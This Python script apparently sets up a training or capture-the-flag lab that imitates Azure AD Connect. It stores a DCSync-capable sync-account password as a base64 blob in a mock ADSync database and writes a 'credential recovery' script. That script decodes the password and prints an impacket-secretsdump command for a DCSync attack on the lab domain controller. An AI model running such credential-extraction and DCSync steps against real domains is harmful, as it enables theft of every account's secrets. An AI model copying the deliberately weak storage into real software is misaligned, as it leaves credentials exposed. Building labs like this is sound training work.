import sqlite3
import os
import json
import base64

os.makedirs("/opt/aadconnect/web", exist_ok=True)
os.makedirs("/opt/aadconnect/keys", exist_ok=True)

db_path = "/opt/aadconnect/ADSync.db"
if os.path.exists(db_path):
    os.remove(db_path)

conn = sqlite3.connect(db_path)
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS mms_server_configuration (
    config_id INTEGER PRIMARY KEY,
    instance_name TEXT,
    service_account TEXT,
    entropy TEXT,
    sync_status TEXT
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS mms_management_agent (
    ma_id TEXT PRIMARY KEY,
    ma_name TEXT,
    connector_type TEXT,
    forest_name TEXT,
    domain_controller TEXT,
    account_name TEXT,
    encrypted_credential TEXT,
    description TEXT
)
""")

entropy_hex = "4d656761436c6f756453796e63456e74726f70793230323621"
cur.execute("""
INSERT INTO mms_server_configuration (config_id, instance_name, service_account, entropy, sync_status)
VALUES (1, 'ADSync-Primary', 'NT SERVICE\\ADSync', ?, 'Synchronized')
""", (entropy_hex,))

with open("/opt/aadconnect/keys/entropy.key", "w") as f:
    f.write(entropy_hex + "\n")

raw_secret = {
    "account": "MEGACLOUD\\MSOL_a1b2c3d4e5f6",
    "password": "AADSync_SuperSecret_P@ss2026!#",
    "rights": "Replicating Directory Changes, Replicating Directory Changes All (DCSync)"
}
encrypted_blob = base64.b64encode(json.dumps(raw_secret).encode('utf-8')).decode('utf-8')

cur.execute("""
INSERT INTO mms_management_agent (
    ma_id, ma_name, connector_type, forest_name, domain_controller, account_name, encrypted_credential, description
) VALUES (
    'e8321045-8149-4786-904d-6e828d15a999',
    'Active Directory Domain Services (megacorp-cloud.local)',
    'Extensible2',
    'megacorp-cloud.local',
    '10.110.10.10',
    'MSOL_a1b2c3d4e5f6',
    ?,
    'AD DS Connector synchronization account with directory replication rights.'
)
""", (encrypted_blob,))

conn.commit()
conn.close()

decrypt_script = """#!/usr/bin/env python3
import sqlite3
import base64
import json
import sys
import os

DB_PATH = '/opt/aadconnect/ADSync.db'
KEY_PATH = '/opt/aadconnect/keys/entropy.key'

if not os.path.exists(DB_PATH):
    print(f"[x] Database {DB_PATH} not found!")
    sys.exit(1)

print("=" * 60)
print(" Azure AD Connect (Entra ID) Credential Recovery Tool")
print("=" * 60)

conn = sqlite3.connect(DB_PATH)
cur = conn.cursor()

cur.execute("SELECT entropy FROM mms_server_configuration LIMIT 1")
entropy = cur.fetchone()[0]
print(f"[*] Retrieved Cryptographic Entropy: {entropy}")

cur.execute("SELECT ma_name, account_name, encrypted_credential FROM mms_management_agent")
rows = cur.fetchall()

for ma_name, account, blob in rows:
    print(f"\\n[*] Connector: {ma_name}")
    print(f"[*] Sync Account: {account}")
    try:
        decrypted = json.loads(base64.b64decode(blob).decode('utf-8'))
        print("[+] Decryption Successful!")
        print(f"    Account Name : {decrypted.get('account')}")
        print(f"    Password     : {decrypted.get('password')}")
        print(f"    Permissions  : {decrypted.get('rights')}")
        print(f"\\n[!] Next Step: Use this account to perform a DCSync attack against Domain Controller 10.110.10.10:")
        print(f"    impacket-secretsdump 'megacorp-cloud.local/{account}:{decrypted.get('password')}@10.110.10.10'")
    except Exception as e:
        print(f"[x] Decryption error: {e}")

conn.close()
"""

with open("/opt/aadconnect/decrypt_aad.py", "w") as f:
    f.write(decrypt_script)
os.chmod("/opt/aadconnect/decrypt_aad.py", 0o755)

web_html = """<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Entra Connect - Sync Service Manager</title>
    <style>
        body { font-family: Segoe UI, sans-serif; background-color: #f3f3f3; margin: 40px; color: #333; }
        .card { background: white; padding: 25px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
        h1 { color: #0078d4; border-bottom: 2px solid #0078d4; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f8f9fa; }
        .badge { background: #107c41; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Microsoft Entra Connect Synchronization Manager</h1>
        <p><strong>Synchronization Server:</strong> hybrid-sync-srv.megacorp-cloud.local</p>
        <p><strong>Status:</strong> <span class="badge">Healthy (Active)</span></p>
        <p><strong>Active Directory DC:</strong> 10.110.10.10 (megacorp-cloud.local)</p>
        <p><strong>Database Storage:</strong> LocalDB / SQLite (/opt/aadconnect/ADSync.db)</p>
        <h3>Configured Connectors</h3>
        <table>
            <tr>
                <th>Connector Name</th>
                <th>Type</th>
                <th>Directory Service</th>
                <th>Service Account</th>
            </tr>
            <tr>
                <td>megacorp-cloud.local AD DS</td>
                <td>Active Directory</td>
                <td>10.110.10.10</td>
                <td>MSOL_a1b2c3d4e5f6</td>
            </tr>
        </table>
        <br>
        <small>System managed by DevOps Team (devops_admin). For administrative shell access, connect via SSH.</small>
    </div>
</body>
</html>
"""

with open("/opt/aadconnect/web/index.html", "w") as f:
    f.write(web_html)

print("[+] Azure AD Connect synchronization database and web interface configured successfully!")
